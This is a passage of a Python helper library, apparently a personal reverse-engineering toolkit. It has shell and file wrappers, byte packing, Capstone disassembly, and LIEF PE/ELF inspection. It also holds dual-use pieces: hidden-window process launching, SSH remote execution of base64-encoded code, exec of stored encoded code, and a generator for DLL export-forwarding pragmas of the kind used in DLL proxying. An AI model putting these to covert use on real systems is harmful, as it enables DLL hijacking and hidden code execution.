#--------------------------------------------------------------------------------
# import- im-
import sys
from ctypes import *

import os
from os import getenv
from os import rename as ren
from os import makedirs as mkdir
md = mkdir

from os.path import isfile
from os.path import isdir
from os.path import abspath
from os.path import basename
from os.path import dirname
from os.path import join as pin
from os.path import exists as exist

from functools import reduce
from functools import partial

import re
from re import findall
from re import match
from re import sub as gsub
from re import search
from re import split

from io import StringIO as sio
from io import BytesIO as bio

from shutil import which
from glob import glob
glob = partial(glob, recursive=True)

from threading import Thread
from threading import Lock
from concurrent.futures import ThreadPoolExecutor as TPool
from concurrent.futures import as_completed as twait
from multiprocessing import Pool
from multiprocessing import cpu_count

from inspect import isgenerator as isgen
from inspect import isgeneratorfunction as isgenfn
from inspect import ismodule as ismod
from inspect import isclass
from inspect import ismethod
from inspect import isfunction as isfn
from inspect import getfullargspec as getarg

isins = isinstance

import random
from random import choice

import time
random.seed(time.time())

#--------------------------------------------------------------------------------
# shell-

pwd = cwd = lambda :abspath(os.getcwd())

def is_plat(plat):
    from platform import system
    return {
        'win':'windows',
        'windows':'windows',
        'lix':'linux',
        'linux':'linux',
        'darwin':'darwin',
        'mac':'darwin',
        'java':'java'
    }[plat.lower()]==system().lower()

def set_python_path(*paths):
    def _get_dir_path(path):
        if isfile(path):
            return dirname(path)
        if isdir(path):
            return path
    if paths:
        sys.path = list(map(_get_dir_path, paths)) + sys.path
    else:
        sys.path.insert(0, dirname(sys.argv[0]))
    
stpy = set_python_path

def chdir(path=''):
    from os import chdir as os_chdir
    if exist(path):
        if isfile(path):
            os_chdir(dirname(path))
        if isdir(path):
            os_chdir(path)
cd = chdir

def rm(path):
    from shutil import rmtree
    from os import remove
    if isdir(path):
        rmtree(path)
    elif isfile(path):
        remove(path)

def cp(src_path, dst_path, rename=False):
    from shutil import copy
    from shutil import copytree
    
    if not rename:
        dst_path = pin(dst_path, basename(src_path))
    if isfile(src_path):
        copy(src_path, dst_path)
    elif isdir(src_path):
        copytree(src_path, dst_path)
        
def rd(file_path='@@@bin@@@', mode='rb'):
    import chardet
    if mode=='rb':
        with open(file_path, mode) as f:
            return f.read()
    elif mode=='r':
        with open(file_path, 'rb') as f:
            content = f.read()
            return content.decode(chardet.detect(content)['encoding'])
    elif mode=='l':
        with open(file_path, 'rb') as f:
            content = f.read()
            return sio(content.decode(chardet.detect(content)['encoding']).replace('\r\n', '\n')).readlines()
    else:
        return None
        
def wt(file_path='@@@bin@@@', mode='wb', encoding='utf-8'):
    def wt_(data):
        if 'b' in mode:
            with open(file_path, mode) as f:
                f.write(data)
        else:
            with open(file_path, mode, encoding=encoding) as f:
                f.write(data.replace('\r', ''))
    return wt_
    
def rdz():
    return
    
def wtz(file_path='@@@bin@@@', mode='w'):
    import zipfile
    def put_file(name, data, mode=mode):
        with zipfile.ZipFile(file_path, mode) as zf:
            zf.writestr(name, data, compress_type=None, compresslevel=None)
        return partial(put_file, mode='a')
    return put_file
    
def pp(*command):
    import subprocess
    def communicate(input=b'', shell=True, err=False, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE):
        if is_plat('win'):
            st = subprocess.STARTUPINFO()
            st.dwFlags = subprocess.STARTF_USESHOWWINDOW
            st.wShowWindow = subprocess.SW_HIDE
            command_ = list(command)
        else:
            st = None
            command_ = ' '.join(command)
        if err:
            p_pipe = subprocess.Popen(command_, stdin=stdin, stdout=stdout, stderr=stderr, startupinfo=st, shell=shell)
            return p_pipe.communicate(input)
        else:
            p_pipe = subprocess.Popen(command_, stdin=stdin, stdout=stdout, stderr=stderr, startupinfo=st, shell=shell)
            return p_pipe.communicate(input)[0]
    return communicate
    
def run(*cmd):
    pp(*cmd)(stdin=None, stdout=None, stderr=None)
    
def cmd_exec(cmds):
    for cmd in cmds:
        run(*cmd)
    
class px(object):
    def __init__(self, shell=True):
        self.data = b''
        self.shell = shell
        self.cmd = []
    
    def __call__(self, *args):
        if self.cmd:
            self.cmd.append('|')
        self.cmd.extend(args)
        return self
        
    @property
    def val(self):
        if is_plat('win'):
            self.data = pp(*self.cmd)(self.data, shell=self.shell)
        else:
            self.data = pp(' '.join(self.cmd))(self.data, shell=self.shell)
        return self.data
        
    @val.setter
    def val(self, data):
        self.data = data
        
px = px()
#--------------------------------------------------------------------------------
# clip-

def set_clip(data):
    try:
        import win32clipboard
        import win32con
        data = str(data)
        win32clipboard.OpenClipboard()
        win32clipboard.EmptyClipboard()
        win32clipboard.SetClipboardData(win32con.CF_UNICODETEXT, data)
        win32clipboard.CloseClipboard()
    except:
        if which('win32yank.exe'):
            pp('win32yank.exe', '-i')(data.encode())

def get_clip():
    try:
        import win32clipboard
        import win32con
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data
    except:
        if which('win32yank.exe'):
            return pp('win32yank.exe', '-o')().decode()

#--------------------------------------------------------------------------------
# enc- encode-

fromhex = bytes.fromhex
from struct import pack
from struct import unpack

int_x = lambda data: int(data, 0) if type(data)==str else int(data)

def p8(*datas):
    if str(datas[-1]).strip()=='>':
        datas = datas[:-1]
        mode = '>'
    elif str(datas[-1]).strip()=='<':
        datas = datas[:-1]
        mode = '<'
    else:
        mode = '<'
    p8_single = lambda d,m='<':pack(m.strip()+'B', int_x(d)%2**8)
    ret = b''
    for i in datas:
        ret += p8_single(i, mode)
    return ret
    

def p16(*datas):
    if str(datas[-1]).strip()=='>':
        datas = datas[:-1]
        mode = '>'
    elif str(datas[-1]).strip()=='<':
        datas = datas[:-1]
        mode = '<'
    else:
        mode = '<'
    p16_single = lambda d,m='<':pack(m.strip()+'H', int_x(d)%2**16)
    ret = b''
    for i in datas:
        ret += p16_single(i, mode)
    return ret

def p32(*datas):
    if str(datas[-1]).strip()=='>':
        datas = datas[:-1]
        mode = '>'
    elif str(datas[-1]).strip()=='<':
        datas = datas[:-1]
        mode = '<'
    else:
        mode = '<'
    p32_single = lambda d,m='<':pack(m.strip()+'L', int_x(d)%2**32)
    ret = b''
    for i in datas:
        ret += p32_single(i, mode)
    return ret

def p64(*datas):
    if str(datas[-1]).strip()=='>':
        datas = datas[:-1]
        mode = '>'
    elif str(datas[-1]).strip()=='<':
        datas = datas[:-1]
        mode = '<'
    else:
        mode = '<'
    p64_single = lambda d,m='<':pack(m.strip()+'Q', int_x(d)%2**64)
    ret = b''
    for i in datas:
        ret += p64_single(i, mode)
    return ret

u8 = lambda d,m='<':unpack(m.strip()+'B', d[0:1])[0] if len(d)>=1 else None
u16 = lambda d,m='<':unpack(m.strip()+'H', d[0:2])[0] if len(d)>=2 else None
u32 = lambda d,m='<':unpack(m.strip()+'L', d[0:4])[0] if len(d)>=4 else None
u64 = lambda d,m='<':unpack(m.strip()+'Q', d[0:8])[0] if len(d)>=8 else None
    
def mxor(data1, data2):
    return bytes([i[0]^i[1] for i in zip(data1, data2)])
    
def mand(data1, data2):
    return bytes([i[0]&i[1] for i in zip(data1, data2)])
    
def mor(data1, data2):
    return bytes([i[0]|i[1] for i in zip(data1, data2)])
    
def bit(data):
    def bit_val(a, b=1):
        x = bin(data)[2:][::-1]
        if a<0 or b<0:
            raise ValueError('out of range')
        if a>=len(x):
            return 0
        if b==0 or a+b>=len(x):
            return int('0b'+x[a:][::-1], 0)
        else:
            return int('0b'+x[a:a+b][::-1], 0)
    return bit_val

def fm(data, x=' '):
    return x + x.join(findall('..', data))
    
def exor(data, key):
    key = list(key)
    ret = []
    for i in range(len(data)):
        ret.append(data[i]^key[i%len(key)])
    return bytes(ret)
    
def dxor(data, key):
    return exor(data, key)

def e64(data, url_safe=False):
    import base64
    if url_safe:
        return base64.urlsafe_b64encode(data)
    else:
        return base64.b64encode(data)
def d64(data, url_safe=False):
    import base64
    if url_safe:
        return base64.urlsafe_b64decode(data)
    else:
        return base64.b64decode(data)

def ezip(data):
    import gzip
    return gzip.compress(data)
    
def dzip(data):
    import gzip
    return gzip.decompress(data)
    
def etxt(text):
    return e64(ezip(text.encode()))
    
def dtxt(data):
    return dzip(d64(data)).decode()
    
def eurl(url):
    import urllib.parse
    return urllib.parse.quote(url)

def durl(url):
    import urllib.parse
    return urllib.parse.unquote(url)
    
def decode(data):
    import chardet
    return data.decode(chardet.detect(data)['encoding'])
    
def md5(data):
    import hashlib
    m = hashlib.md5()
    if type(data)==bytes:
        m.update(data)
        return m.hexdigest()
    if type(data)==str and exist(data):
        with open(data,'rb') as f:
            while True:
                data_flow = f.read(0x8000)
                if not data_flow:
                    break
                m.update(data_flow)
        return m.hexdigest()
    return ''
    
    
def sha1(data):
    import hashlib
    m = hashlib.sha1()
    if type(data)==bytes:
        m.update(data)
        return m.hexdigest()
    if type(data)==str and exist(data):
        with open(data,'rb') as f:
            while True:
                data_flow = f.read(0x8000)
                if not data_flow:
                    break
                m.update(data_flow)
        return m.hexdigest()
    return ''
    
def sha256(data):
    import hashlib
    m = hashlib.sha256()
    if type(data)==bytes:
        m.update(data)
        return m.hexdigest()
    if type(data)==str and exist(data):
        with open(data,'rb') as f:
            while True:
                data_flow = f.read(0x8000)
                if not data_flow:
                    break
                m.update(data_flow)
        return m.hexdigest()
    return ''

def dmjs(obj, fd=None):
    import json
    x = obj
    if '__dict__' in dir(obj):
        x = obj.__dict__
    if fd:
        json.dump(x, fd)
    else:
        return json.dumps(x)

def ldjs(json_str, obj_hook=None, fd=None):
    import json
    if fd:
        return json.load(json_str, fd, object_hook=obj_hook)
    else:
        return json.loads(json_str, object_hook=obj_hook)
#--------------------------------------------------------------------------------
# str-

def has_ch(data):
    for i in data:
        if '\u4e00' <= i <= '\u9fff':
            return True
    return False
    
def line_filter(pattern, data):
    data = data.replace('\r', '')
    data = '\n'.join(filter(lambda item:item, findall(pattern, data, re.I)))
    return data
    
def neg_line_filter(pattern, data):
    data = data.replace('\r', '').split('\n')
    data = '\n'.join(filter(lambda item:item and not search(pattern, item, re.I), data))
    return data
    
    
def block_filter(pattern, data, sep_pattern=r'.*{}.*\n|.*{}.*\n|\n--.*\n|\n==.*\n'.format('-'*4, '='*4)):
    data = split(sep_pattern, data)
    data = ('-'*80+'\n').join(filter(lambda item:item and search(pattern, item, re.I), data))
    return data
    
    
def neg_block_filter(pattern, data, sep_pattern=r'.*{}.*\n|.*{}.*\n|\n--.*\n|\n==.*\n'.format('-'*4, '='*4)):
    data = split(sep_pattern, data)
    data = ('-'*80+'\n').join(filter(lambda item:item and not search(pattern, item, re.I), data))
    return data
    
def line_remove(data):
    return gsub(r'\n\s*\n', '\n', data.replace('\r', ''))

def line_strip(data):
    return en(map(lambda line:line.strip(), data.replace('\r', '').split('\n')))

lr = line_remove    
ls = line_strip
lsr = lambda data:lr(ls(data))

def str_to_block(pattern, data, sep='-'):
    return en([sep*80+'\n'+line if search(pattern, line, re.I) else line for line in data.replace('\r', '').split('\n')])
    
def sset(data, ignore_case=True):
    def _strip(data):
        class custom_str(str):
            def __init__(self, data):
                self.data = data
            def __hash__(self):
                return hash(self.data.lower())
            def __eq__(self, other):
                return self.lower()==other.lower()
        if type(data)==str:
            if ignore_case:
                return nem(map(lambda x:custom_str(x.strip()), data.split('\n')))
            else:
                return nem(map(lambda x:x.strip(), data.split('\n')))
        ret = []
        try:
            if ignore_case:
                ret = map(lambda x:custom_str(str(x).strip()), data)
            else:
                ret = map(lambda x:str(x).strip(), data)
        except:
            if ignore_case:
                ret = [custom_str(str(data).strip())]
            else:
                ret = [str(data).strip()]
        return nem(ret)
    return set(_strip(data))
#--------------------------------------------------------------------------------
# ffi-

wdl = lambda *args:windll.LoadLibrary(*args)
cdl = lambda *args:cdll.LoadLibrary(*args)

def wea(mod, fn=None):
    if not fn:
        return wdl(mod)._handle
    else:
        ret = eval('bytes(wdl("{}").{})'.format(mod, fn))
        return u32(ret) if len(ret)==4 else u64(ret)
#--------------------------------------------------------------------------------
# util- ut-

p = print            
en = lambda lst:'\n'.join(list(map(str, lst)))
nem = lambda target: list(filter(lambda x:x, target))

def uuid():
    import uuid as lib_uuid
    return lib_uuid.uuid1()
    
def rand_bytes(size):
    import secrets
    return secrets.token_bytes(size)
    
def rand_int(begin, end):
    return random.randint(begin, end)

def pause():
    sys.stdin.read()
    
def bp():
    import pdb
    pdb.set_trace()
    
def shell():
    import IPython
    IPython.embed()

def days(*time1):
    import datetime
    return lambda *time2:str(abs(datetime.datetime(time2[0], time2[1], time2[2])-datetime.datetime(time1[0], time1[1], time1[2]))).split()[0]
    
def shuffle(target):
    tmp_list = list(target).copy()
    random.shuffle(tmp_list)
    ret = None
    if type(target)==str:
        ret = ''.join(tmp_list)
    if type(target)==list:
        ret = tmp_list
    if type(target)==bytes:
        ret = bytes(tmp_list)
    if type(target)==tuple:
        ret = tuple(tmp_list)
    return ret
    
def fmap(data):
    ret = []
    def _fmap(_data):
        try:
            if type(_data)==str or type(_data)==bytes or type(_data)==dict:
                raise ValueError
            for i in _data:
                _fmap(i)
        except:
            ret.append(_data)
    _fmap(data)
    return ret
    
def rdict(src_map):
    src_map = dict(src_map)
    dst_map = {}
    for k in src_map:
        v = src_map[k]
        if type(v)==list or type(v)==tuple:
            for k_ in v:
                if dst_map.get(k_):
                    dst_map[k_].extend([k])
                else:
                    dst_map[k_] = [k]
        else:
            if dst_map.get(v):
                dst_map[v].extend([k])
            else:
                dst_map[v] = [k]
    return dst_map
    
class xtargs(object):
    def __init__(self):
        import argparse
        self.parser = argparse.ArgumentParser(description='')
        self.groups = {}
        
    def add_val(self, key, help, metavar='', type=str, default=None):
        self.parser.add_argument(key, type=type, help=help, metavar=metavar, default=default)
        return self
        
    def add_flag(self, key, help, default=None):
        self.parser.add_argument(key, action='store_true', help=help, default=default)
        return self
        
    def add_mutex_val(self, key, help, metavar='', type=str, default=None, group='xtargs'):
        if group in self.groups:
            args_group = self.groups[group]
        else:
            self.groups[group] = self.parser.add_mutually_exclusive_group()
        self.groups[group].add_argument(key, type=type, help=help, metavar=metavar, default=default)
        return self
        
    def add_mutex_flag(self, key, help, default=None, group='xtargs'):
        if group in self.groups:
            args_group = self.groups[group]
        else:
            self.groups[group] = self.parser.add_mutually_exclusive_group()
        self.groups[group].add_argument(key, action='store_true', help=help, default=default)
        return self
        
    @property
    def val(self):
        return self.parser.parse_args()
        
class ssh(object):
    def __init__(self, *ssh_args, **ssh_kwargs):
        from fabric import Connection
        self.conn = Connection(*ssh_args, **ssh_kwargs)
        self.host = self.conn.host
        
    def pp(self, cmd):
        def _pp(input=b'', hide='out', err=False):
            self.ret = self.conn.run(cmd, hide=hide, warn=True)
            if err:
                return (self.ret.stdout.strip(), self.ret.stderr.strip())
            else:
                return self.ret.stdout.strip()
        return _pp
        
    def rd(self, path, mode='rb'):
        ret = bio()
        self.get(path, ret)
        if mode=='rb':
            return ret.getvalue()
        elif mode=='r':
            return decode(ret.getvalue())
        else:
            return None
        
    def wt(self, path, mode='wb', encoding='utf-8'):
        def wt_(data):
            if 'b' not in mode:
                data = data.encode(encoding)
            ds = bio(data)
            self.put(ds, path)
        return wt_
        
    def put(self, *args, **kwargs):
        return self.conn.put(*args, **kwargs)
        
    def get(self, *args, **kwargs):
        return self.conn.get(*args, **kwargs)
    
    def rm(self, path):
        return self.pp(r"echo {} | base64 -d  | sed 's/\r//g'  | xargs -r -d '\n' rm -rf".format(e64(path.encode()).decode()))()
    
    def pwd(self):
        return self.pp('pwd')().strip()
        
    cwd = pwd
        
    def cd(self, *args, **kwargs):
        return self.conn.cd(*args, **kwargs)
        
    def prefix(self, *args, **kwargs):
        return self.conn.prefix(*args, **kwargs)
        
    def sh(self, code_src):
        pass
        
    def xt(self, code_src, clean=True, core=None, err=False, hide='out'):
        with self.cd('~'):
            home_path = self.pwd()
        if not core:
            core = rd(__file__, 'r')
        self.put(sio(core), '@@@xtools_exec@@@')
        code_src_base64 = e64(code_src.encode()).decode()
        
        if len(code_src_base64)>5000:
            self.put(sio(code_src_base64), f'{home_path}/@@@py_xtools_src_base64@@@')
            dispatch_flag = ('-p', f'{home_path}/@@@py_xtools_src_base64@@@')
        else:
            dispatch_flag = ('-b', code_src_base64)
            
        ret = self.pp('python3 {}/@@@xtools_exec@@@ {} {}'.format(home_path, *dispatch_flag))(err=err, hide=hide)
        if clean:
            self.rm(f'{home_path}/@@@xtools_exec@@@')
            self.rm(f'{home_path}/@@@py_xtools_src_base64@@@')
        return ret
        
class xt_util(object):
    def __init__(self, db_path=None):
        if db_path:
            self.db_path = db_path
        else:
            self.db_path = abspath(pin(__file__, '..', '..', '..', 'wiki', 'xtools.db'))
        if not exist(self.db_path):
            wt(self.db_path)(dmjs({}).encode())
        self.db = ldjs(rd(self.db_path).decode())
    
    def call(self, code_id):
        if type(self.db)==dict:
            exec(d64(self.db[code_id].encode()).decode(), globals())
        return self
        
    def add(self, code_src):
        code_id = uuid().hex
        code_val = e64(code_src.encode()).decode()
        
        if code_val in self.db.values():
            return ''
        else:
            self.db[code_id] = code_val
            wt(self.db_path)(dmjs(self.db).encode())
            return code_id
        
    def rm(self, code_id):
        code_src = self.db.pop(code_id)
        wt(self.db_path)(dmjs(self.db).encode())
        return etxt(d64(code_src.encode()).decode())
        
    def get(self, code_id=None):
        ret = sio()
        if code_id:
            code_src = self.db.get(code_id)
            code_src = d64(code_src.encode()).decode()
            p('id: ', code_id, file=ret)
            p(etxt(code_src), file=ret)
        else:
            p('-'*80, file=ret)
            for code_id_ in self.db:
                code_src_ = self.db.get(code_id_)
                code_src_ = d64(code_src_.encode()).decode()
                p('id: ', code_id_, file=ret)
                p(etxt(code_src_), file=ret)
                p('-'*80, file=ret)
        return ret.getvalue()
        
    def set(self, code_id, code_src):
        code_val = e64(code_src.encode()).decode()
        self.db[code_id] = code_val
        wt(self.db_path)(dmjs(self.db).encode())
        return code_id
        
    @staticmethod
    def _parse_spec_blks(src_code):
        blks = str_to_block(r'\s*#@wsl@[\w-]+\s*|\s*#@win\s*|\s*#@ssh@.*', src_code, '$')
        blks = nem([blk.strip() for blk in split(r'\${80,}', blks)])
        spec_blks = []
        
        for blk in blks:
            spec = blk.split('\n')[0].strip()
            spec_match = match(r'\s*#@wsl@[\w-]+\s*|\s*#@win\s*|\s*#@ssh@.*', spec)
            if spec_match:
                spec = spec_match.group().strip('#@').split('@')
            else:
                spec = None
            spec_blks.append({'spec':spec, 'src':blk})
        return spec_blks
        
    @staticmethod
    def _dispatch_spec_blks(spec_blks):
        for spec_blk in spec_blks:
            spec = spec_blk['spec']
            spec_blk_src = e64(spec_blk['src'].encode()).decode()
            
            if len(spec_blk_src)>5000:
                wt('@@@py_xtools_src@@@')(spec_blk_src.encode())
                dispatch_flag = ('-p', '@@@py_xtools_src@@@')
            else:
                dispatch_flag = ('-b', spec_blk_src)
                
            if not spec:
                pp('python3.exe', wcx(__file__)[0] if is_plat('win') else wcx(__file__)[0].join(["'", "'"]), *dispatch_flag)(stdin=None, stdout=None, stderr=None)
            else:
                if spec[0]=='win':
                    pp('python3.exe', wcx(__file__)[0] if is_plat('win') else wcx(__file__)[0].join(["'", "'"]), *dispatch_flag)(stdin=None, stdout=None, stderr=None)
                if spec[0]=='wsl':
                    wsl(spec[1])
                    pp('wsl.exe', 'python3', lcx(__file__)[0], *dispatch_flag)(stdin=None, stdout=None, stderr=None)
                if spec[0]=='ssh':
                    ssh(spec[1].strip()+'@'+spec[2].strip()).xt(spec_blk['src'], hide=None)
            if len(spec_blk_src)>5000:
                rm('@@@py_xtools_src@@@')

    @staticmethod
    def dispatch(src_code):
        spec_blks = xt_util._parse_spec_blks(src_code)
        xt_util._dispatch_spec_blks(spec_blks)

xt = xt_util
    
def tcp(ip='127.0.0.1', port=7777):
    import socket
    a = (ip.strip(), int(port))
    c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c.connect(a)
    s = c.sendall
    def r(buf_len=0x2000):
        return c.recv(buf_len)
    class tcp_client(object):
        def __init__(self, c, s, r, a):
            self.c = c
            self.s = s
            self.r = r
            self.a = a
        def __repr__(self):
            return 'TCP: %s' % str(self.a)
    return tcp_client(c, s, r, a)

def udp(ip='127.0.0.1', port=7777):
    import socket
    a = (ip.strip(), int(port))
    c = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    def s(data):
        return c.sendto(data, (str(ip).strip(), int(port)))
    def r(buf_len=0x2000):
        return c.recvfrom(buf_len)[0]
    class udp_client(object):
        def __init__(self, c, s, r, a):
            self.c = c
            self.s = s
            self.r = r
            self.a = a
        def __repr__(self):
            return 'UDP: %s' % str(self.a)
    return udp_client(c, s, r, a)
    
def eval_net_seg(ip, mask='255.255.255.0'):
    if type(mask)==str:
        return '.'.join(map(lambda x:str(x), list(mand(map(lambda x:int(x), ip.strip().split('.')), map(lambda x:int(x), mask.strip().split('.'))))))+'/{}'.format(bin(u32(bytes(map(lambda x:int(x), mask.split('.'))), '>'))[2:].count('1'))
    if type(mask)==int:
        return '.'.join(map(lambda x:str(x), list(mand(map(lambda x:int(x), ip.strip().split('.')), p32(int('0b'+(mask*'1').ljust(32, '0'), 2), '>')))))+'/{}'.format(mask)
#--------------------------------------------------------------------------------
# cap- capstone- dis- disasm-

class cs(object):
    def __init__(self, mod='x32'):
        import capstone
        mod = mod.strip()
        mod = {
            'x16':(capstone.CS_ARCH_X86, capstone.CS_MODE_16),
            'x86':(capstone.CS_ARCH_X86, capstone.CS_MODE_32),
            'x32':(capstone.CS_ARCH_X86, capstone.CS_MODE_32),
            'x64':(capstone.CS_ARCH_X86, capstone.CS_MODE_64),
            'a32':(capstone.CS_ARCH_ARM, capstone.CS_MODE_ARM),
            'a32.thumb':(capstone.CS_ARCH_ARM, capstone.CS_MODE_THUMB),
            'a64':(capstone.CS_ARCH_ARM64, capstone.CS_MODE_ARM),
            'm32':(capstone.CS_ARCH_MIPS, capstone.CS_MODE_MIPS32),
            'm32.r6':(capstone.CS_ARCH_MIPS, capstone.CS_MODE_MIPS32R6),
            'm64':(capstone.CS_ARCH_MIPS, capstone.CS_MODE_MIPS64)
        }[mod]
        self.md = capstone.Cs(*mod)
        self.md.detail = True
        
    def dis(self, code, off=0):
        if type(code)==str:
            code = fromhex(code)
        return [i for i in self.md.disasm(code, off)]
        
    def d(self, code, off=0):
        ret = ''
        for i in self.dis(code, off):
            ret += '0x%X:\t%-30s\t%s\t%s\n' %(i.address, i.bytes.hex().upper(), i.mnemonic, i.op_str)
        return ret
#--------------------------------------------------------------------------------
# lief- pe- elf-

def exe(exe_obj):
    import lief
    from lief import parse
    
    class pe(object):
        def __init__(self, pe_obj):
            self.img = self.obj = self.pe_obj = pe_obj
            self.h = self.pe_obj.header
            self.oh = self.pe_obj.optional_header
        def dump(self, path):
            self.pe_obj.write(path)
        def read(self, rva_or_va, size):
            return bytes(self.pe_obj.get_content_from_virtual_address(rva_or_va, size))
        def ro(self, rva):
            return self.pe_obj.rva_to_offset(rva)
        def vo(self, va):
            return self.pe_obj.va_to_offset(va)
        def base(self, new_base=None):
            if new_base!=None:
                self.pe_obj.optional_header.imagebase = new_base
            else:
                return self.pe_obj.optional_header.imagebase
        def entry(self, new_entry=None):
            if new_entry!=None:
                self.pe_obj.optional_header.addressof_entrypoint = new_entry
            else:
                return self.pe_obj.optional_header.addressof_entrypoint
        def subsystem(self, new_subsystem=None):
            if new_subsystem==None:
                return self.oh.subsystem
            else:
                new_subsystem = new_subsystem.strip().lower()
                if new_subsystem.startswith('n'):
                    self.oh.subsystem = lief.PE.SUBSYSTEM.NATIVE
                if new_subsystem.startswith('c'):
                    self.oh.subsystem = lief.PE.SUBSYSTEM.WINDOWS_CUI
                if new_subsystem.startswith('g'):
                    self.oh.subsystem = lief.PE.SUBSYSTEM.WINDOWS_GUI
        @property
        def dlib(self):
            return self.pe_obj.libraries
        @property
        def iscui(self):
            return self.oh.subsystem == lief.PE.SUBSYSTEM.WINDOWS_CUI
        @property
        def isgui(self):
            return self.oh.subsystem == lief.PE.SUBSYSTEM.WINDOWS_GUI
        @property
        def isnt(self):
            return self.oh.subsystem == lief.PE.SUBSYSTEM.NATIVE
        @property
        def arch(self):
            return self.pe_obj.header.machine
        @property
        def is32(self):
            return self.pe_obj.header.machine==lief.PE.MACHINE_TYPES.I386
        @property
        def is64(self):
            return self.pe_obj.header.machine==lief.PE.MACHINE_TYPES.AMD64
        @property
        def isdll(self):
            return lief.PE.HEADER_CHARACTERISTICS.DLL in self.pe_obj.header.characteristics_list
        @property
        def isdrv(self):
            return self.pe_obj.optional_header.subsystem==lief.PE.SUBSYSTEM.NATIVE
        @property
        def isexe(self):
            return not self.isdll and not self.isdrv
        @property
        def nx(self):
            return self.pe_obj.has_nx
        @property
        def pie(self):
            return self.pe_obj.is_pie
        @property
        def h_rel(self):
            return self.pe_obj.has_relocations
        @property
        def h_res(self):
            return self.pe_obj.has_resources
        @property
        def h_tls(self):
            return self.pe_obj.has_tls
        @property
        def h_im(self):
            return self.pe_obj.has_imports
        @property
        def h_ex(self):
            return self.pe_obj.has_exports
        @property
        def h_exc(self):
            return self.pe_obj.has_exceptions
        @property
        def ex(self):
            class ent:
                def __init__(self, ord, name, addr):
                    self.ord = ord
                    self.name = name
                    self.addr = addr
                def __str__(self):
                    return '{: >5} 0x{:0>8X}  {}'.format(self.ord, self.addr, self.name)
                def __repr__(self):
                    return '{: >5} 0x{:0>8X}  {}'.format(self.ord, self.addr, self.name)
            return [ent(i.ordinal, i.name, i.address) for i in self.pe_obj.get_export().entries]
            
        def dlfw(self, org_mod_name):
            img = self.pe_obj
            if (not img) or (not img.has_exports):
                return
            org_mod_name = gsub(r'\.exe$|\.dll$', '', org_mod_name.strip().replace('\\', '/'))
            img_ex = img.get_export()
            ret = sio('')
            for i in img_ex.entries:
                if i.name:
                    if i.name[0] == '_':
                        print('#pragma comment(linker, "/export:{}={}.{}")'.format('_'+i.name, org_mod_name, i.name), file=ret)
                    else:
                        print('#pragma comment(linker, "/export:{}={}.{}")'.format(i.name, org_mod_name, i.name), file=ret)
                else:
                    print('#pragma comment(linker, "/export:ord{}={}.#{},@{},NONAME")'.format(i.ordinal, org_mod_name, i.ordinal, i.ordinal), file=ret)
            return ret.getvalue()
        def dd(self, dd_type):
            dd_type_map = {
                'ex':lief.PE.DATA_DIRECTORY.EXPORT_TABLE, 
                'im':lief.PE.DATA_DIRECTORY.IMPORT_TABLE,
                'dim':lief.PE.DATA_DIRECTORY.DELAY_IMPORT_DESCRIPTOR,
                'exc':lief.PE.DATA_DIRECTORY.EXCEPTION_TABLE,
                'tls':lief.PE.DATA_DIRECTORY.TLS_TABLE,
                'iat':lief.PE.DATA_DIRECTORY.IAT,
                'rel':lief.PE.DATA_DIRECTORY.BASE_RELOCATION_TABLE,
                'res':lief.PE.DATA_DIRECTORY.RESOURCE_TABLE,
                'cfg':lief.PE.DATA_DIRECTORY.LOAD_CONFIG_TABLE
            }
            class dd_ent(object):
                def __init__(dd_self, rva, size, dd_type, inf):
                    dd_self.rva = rva
                    dd_self.size = size
                    dd_self.inf = inf
                def __repr__(dd_self):
                    return dd_self.inf
                def __str__(dd_self):
                    return dd_self.inf
                def __call__(dd_self, new_rva=0, new_size=0):
                    self.pe_obj.data_directory(dd_type_map[dd_type]).rva = new_rva
                    self.pe_obj.data_directory(dd_type_map[dd_type]).size = new_size
                    return self
                @property
                def data(dd_self):
                    return self.read(dd_self.rva, dd_self.size)
            if dd_type in dd_type_map:
                inf = sio()
                tmp_dd_ent = self.pe_obj.data_directory(dd_type_map[dd_type])
                print(tmp_dd_ent, file=inf)
                if tmp_dd_ent.has_section:
                    print(tmp_dd_ent.section, file=inf)
                return dd_ent(tmp_dd_ent.rva, tmp_dd_ent.size, dd_type, inf.getvalue())
        def s_ex(self, target=''):
            img = self.pe_obj
            if (not img) or (not img.has_exports):
                return ''
            img_ex = img.get_export()
            ret = sio('')
            for i in img_ex.entries:
                print('{}{: >5} 0x{:0>8X}  {}'.format(target, i.ordinal, i.address, i.name), file=ret)
            return ret.getvalue()
        def s_im(self, target=''):
            img = self.pe_obj
            if not img:
                return
            ret = sio('')
            for i in img.imports:
                for j in i.entries:
                    print('{} mod: {} | iat: 0x{:0>8X} | {}'.format(target, i.name, j.iat_address, ('ord: '+hex(j.ordinal)) if j.is_ordinal else ('name: '+j.name)), file=ret)
            return ret.getvalue()
        @property
        def inf(self):
            inf_data = [
                'PE ' + str(self.arch).split('.')[-1], 
                'Base: '+hex(self.base()), 
                'EP(RVA): '+hex(self.entry()), 
                'EP(RAW): '+hex(self.ro(self.entry())),
                'PIE: '+str(self.pie),
                str(self.subsystem()),
                'CheckSum: {}'.format(hex(self.pe_obj.optional_header.checksum))
            ]
            return '\n'.join(inf_data)
            
    class elf(object):
        def __init__(self, elf_obj):
            self.img = self.obj = self.elf_obj = elf_obj
        def dump(self, path):
            self.elf_obj.write(path)
        def read(self, va, size):
            return bytes(self.elf_obj.get_content_from_virtual_address(va, size))
        def ro(self, rva):
            return self.vo(rva+self.base())
        def vo(self, va):
            return self.elf_obj.virtual_address_to_offset(va)
        def base(self, new_base=None):
            if new_base!=None:
                pass
            else:
                return self.elf_obj.imagebase
        def entry(self, new_entry=None):
            if new_entry!=None:
                pass
            else:
                return self.elf_obj.entrypoint - self.elf_obj.imagebase
        @property
        def dlib(self):
            return self.elf_obj.libraries
        @property
        def is32(self):
            return self.elf_obj.header.machine_type==lief.ELF.ARCH.i386
        @property
        def is64(self):
            return self.elf_obj.header.machine_type==lief.ELF.ARCH.x86_64
        @property
        def pie(self):
            return self.elf_obj.is_pie
        @property
        def arch(self):
            return self.elf_obj.header.machine_type
        @property
        def inf(self):
            inf_data = [
                'ELF ' + str(self.arch).split('.')[-1],
                'Base: '+hex(self.base()),
                'EP(RVA): '+hex(self.entry()),
                'EP(RAW): '+hex(self.ro(self.entry())),
                'PIE: '+str(self.pie)
